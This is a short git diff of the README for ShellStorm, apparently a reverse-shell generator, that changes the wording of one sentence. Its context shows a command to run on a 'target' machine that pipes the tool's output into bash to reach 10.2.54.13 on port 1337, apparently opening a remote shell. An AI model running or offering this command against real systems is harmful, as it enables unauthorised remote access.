@@ -45,7 +45,7 @@ war
 ![alt text](https://github.com/0bfxGH0ST/ShellStorm/blob/main/screenshots/screenshot2.png)  
 
 ## Try go further
-In some cases you can download shellstorm in any 'target' machine with Linux kernel (or WSL) and execute it by piping it.  
+In some cases you can download shellstorm in any 'target' machine with Linux kernel (or WSL) and execute it by piping it if you prefer.  
 <pre>
 bash shellstorm.sh bash 10.2.54.13 1337 | bash
 </pre>
